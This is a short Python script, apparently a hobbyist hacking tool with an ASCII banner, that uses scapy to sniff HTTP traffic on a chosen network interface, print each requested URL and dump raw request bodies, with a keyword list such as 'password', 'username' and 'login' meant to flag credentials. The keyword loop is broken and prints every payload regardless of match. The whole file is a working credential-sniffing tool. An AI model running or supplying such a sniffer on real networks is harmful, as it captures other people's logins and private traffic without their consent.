import scapy.all as scapy
from scapy_http import http
from termcolor import cprint
import pyfiglet
import sys

networkInterface = sys.argv[1]

logo = pyfiglet.figlet_format("SOSAKORNUT")
cprint(logo,"cyan", "on_blue")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        cprint(url, "cyan")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                for i in str(load):
                    cprint(load, "cyan")
                    break

words = ["password", "user", "username", "login", "pass", "User", "Password"]
sniff(networkInterface)
